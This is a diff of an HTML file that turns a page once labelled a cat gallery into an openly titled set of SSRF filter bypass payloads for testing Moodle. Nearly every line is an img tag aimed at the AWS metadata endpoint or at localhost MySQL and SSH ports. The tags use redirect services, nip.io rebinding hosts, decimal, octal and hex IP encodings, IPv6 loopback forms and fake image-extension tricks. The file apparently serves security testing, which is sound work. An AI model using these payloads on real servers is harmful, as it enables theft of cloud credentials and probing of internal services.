@@ -1,18 +1,42 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Galeri Kucing</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Galeri Testing SSRF</title>
 </head>
 <body>
-    <h1>Gambar Kucing Lucu</h1>
-    
-    <img src="http://169.254.169.254/latest/meta-data/" alt="aws-metadata">
-    
-    <img src="http://[::1]:80/" alt="localhost-ipv6">
-    
-    <img src="http://127.0.0.1:3306" alt="mysql-port">
-    <img src="http://127.0.0.1:22" alt="ssh-port">
-    
-    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="google">
+    <h1>Kumpulan Gambar Testing SSRF Bypass</h1>
+    <p>File ini digunakan untuk menguji ketahanan filter SSRF Moodle.</p>
+
+    <h2>1. HTTP Redirect Bypass</h2>
+    <img src="https://httpbin.org/redirect-to?url=http://169.254.169.254/latest/meta-data/" alt="redirect-aws-metadata">
+    <img src="https://httpbin.org/redirect-to?url=http://127.0.0.1:3306" alt="redirect-mysql-port">
+    <img src="https://httpbin.org/redirect-to?url=http://127.0.0.1:22" alt="redirect-ssh-port">
+
+    <h2>2. DNS Rebinding & Public Resolvers</h2>
+    <img src="http://169.254.169.254.nip.io/latest/meta-data/" alt="nip-aws-metadata">
+    <img src="http://127.0.0.1.nip.io:80/" alt="nip-localhost">
+    <img src="http://localtest.me:80/" alt="localtest-localhost">
+
+    <h2>3. IP Encoding Bypass</h2>
+    <img src="http://2130706433/" alt="decimal-localhost">
+    <img src="http://0177.0.0.1/" alt="octal-localhost">
+    <img src="http://0x7f000001/" alt="hex-localhost">
+
+    <h2>4. IPv6 Bypass</h2>
+    <img src="http://[::1]:80/" alt="ipv6-localhost-short">
+    <img src="http://[0000::1]:80/" alt="ipv6-localhost-medium">
+    <img src="http://[0:0:0:0:0:0:0:1]:80/" alt="ipv6-localhost-long">
+    <img src="http://[fd00:ec2::254]/latest/meta-data/" alt="ipv6-aws-metadata">
+
+    <h2>5. Fake Extension Bypass (Trick Regex)</h2>
+    <img src="http://169.254.169.254/latest/meta-data/#.jpg" alt="aws-fragment-jpg">
+    <img src="http://169.254.169.254/latest/meta-data/?.png" alt="aws-query-png">
+    <img src="http://127.0.0.1:22/#.png" alt="ssh-fragment-png">
+
+    <h2>6. Valid Public Image</h2>
+    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="google-valid-image">
+
 </body>
 </html>
